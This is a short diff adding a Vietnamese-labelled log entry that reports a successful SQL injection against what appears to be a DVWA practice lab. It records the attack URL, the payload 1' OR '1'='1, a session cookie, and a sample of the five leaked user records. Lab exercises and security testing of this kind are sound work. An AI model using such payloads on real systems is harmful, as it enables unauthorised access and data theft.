@@ -1,0 +1,6 @@
+SQL Injection thành công.
+      - URL        : http://13.250.120.1:80/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit
+      - Payload    : 1' OR '1'='1
+      - Cookie     : security=low; PHPSESSID=g7glvapkv8r53se146kfd2bg12
+      - Leak được  : 5 user records
+      - Sample     : First name: admin<br />Surname: admin</pre><pre>ID: 1' OR '1'='1<br />
